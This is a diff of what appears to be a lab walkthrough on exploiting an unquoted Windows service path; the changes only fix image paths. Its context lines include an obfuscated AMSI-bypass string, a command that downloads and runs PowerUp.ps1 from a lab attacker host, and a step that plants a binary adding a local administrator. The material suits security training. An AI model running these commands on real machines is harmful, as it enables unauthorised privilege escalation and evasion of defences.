@@ -19,7 +19,7 @@ description: >-
 sc.exe create "Service" binpath= "C:\Program Files\bin folder\program\bin x64\Service.exe" start= auto
 ```
 
-![](<../../.gitbook/assets/image (11).png>)
+![](<../../../.gitbook/assets/image (11).png>)
 
 3\. Run the following command to create the folders for the service:
 
@@ -27,7 +27,7 @@ sc.exe create "Service" binpath= "C:\Program Files\bin folder\program\bin x64\Se
 mkdir "C:\Program Files\bin folder\program\bin x64"
 ```
 
-![](<../../.gitbook/assets/image (10).png>)
+![](<../../../.gitbook/assets/image (10).png>)
 
 4\. Run icacls to check the current permissions on the directories with a space in it:
 
@@ -36,7 +36,7 @@ icacls.exe "C:\Program Files\bin folder"
 icacls.exe "C:\Program Files\bin folder\program\bin x64"
 ```
 
-![](<../../.gitbook/assets/image (15).png>)
+![](<../../../.gitbook/assets/image (15).png>)
 
 Currently the low privileged users can't create any files in the directories with a space. BUILTIN\Users has (RX) privileges. Which is **RX** (read and execute access). For more information about the icacls access rights check out [this SuperUser](https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item) post.
 
@@ -46,7 +46,7 @@ Currently the low privileged users can't create any files in the directories wit
 icacls.exe "C:\Program Files\bin folder\program" /grant BUILTIN\Users:W
 ```
 
-![](<../../.gitbook/assets/image (8).png>)
+![](<../../../.gitbook/assets/image (8).png>)
 
 6\. Run icacls again the check the permissions on the directory:
 
@@ -54,7 +54,7 @@ icacls.exe "C:\Program Files\bin folder\program" /grant BUILTIN\Users:W
 icacls.exe "C:\Program Files\bin folder\program"
 ```
 
-![](<../../.gitbook/assets/image (3).png>)
+![](<../../../.gitbook/assets/image (3).png>)
 
 ## Attacking
 
@@ -89,7 +89,7 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Prives
 python3 -M http.server 8090
 ```
 
-![](<../../.gitbook/assets/image (43).png>)
+![](<../../../.gitbook/assets/image (43).png>)
 
 2\. Login on `WS01` with the user `John` and the password `Welcome2022!.`
 
@@ -104,11 +104,11 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 iex (iwr http://192.168.248.2:8090/PowerUp.ps1 -usebasicparsing)
 ```
 
-![](<../../.gitbook/assets/image (2).png>)
+![](<../../../.gitbook/assets/image (2).png>)
 
 4\. Execute `Invoke-AllChecks` to run all the checks from `PowerUp`.
 
-![](<../../.gitbook/assets/image (23).png>)
+![](<../../../.gitbook/assets/image (23).png>)
 
 5\. The output tells us there is a service with the name `Service` and it has a **unqouted** service path (`C:\Program Files\bin folder\program\bin x64\service.exe`).
 
@@ -121,11 +121,11 @@ icacls.exe "C:\Program Files\bin folder\program"
 
 We have no write permissions in `C:\Program Files`:
 
-![](<../../.gitbook/assets/image (52).png>)
+![](<../../../.gitbook/assets/image (52).png>)
 
 But we do have write permissions in `C:\Program Files\bin folder\program`.
 
-![](<../../.gitbook/assets/image (20).png>)
+![](<../../../.gitbook/assets/image (20).png>)
 
 7\. To abuse this run the following command from PowerUp, which will create a executable `bin.exe` in the path `C:\Program Files\bin folder\program` which will add a new local administrator.
 
@@ -133,19 +133,19 @@ But we do have write permissions in `C:\Program Files\bin folder\program`.
 Write-ServiceBinary -ServiceName 'Service' -ServicePath 'C:\Program Files\bin folder\program\bin.exe' -Username 'privesc' -Password "Welcome2022!" 
 ```
 
-![](<../../.gitbook/assets/image (22).png>)
+![](<../../../.gitbook/assets/image (22).png>)
 
 8\. Our current user can't start the service, which means we should restart the machine and check if the user `privesc` is created.
 
-![](<../../.gitbook/assets/image (13).png>)
+![](<../../../.gitbook/assets/image (13).png>)
 
-![](<../../.gitbook/assets/image (9).png>)
+![](<../../../.gitbook/assets/image (9).png>)
 
 9\. Start a new PowerShell session as Administrator and fill in the credentials `privesc:Welcome2022!`.
 
-![](<../../.gitbook/assets/image (47).png>)
+![](<../../../.gitbook/assets/image (47).png>)
 
-![](<../../.gitbook/assets/image (39).png>)
+![](<../../../.gitbook/assets/image (39).png>)
 
 #### Cleanup
 
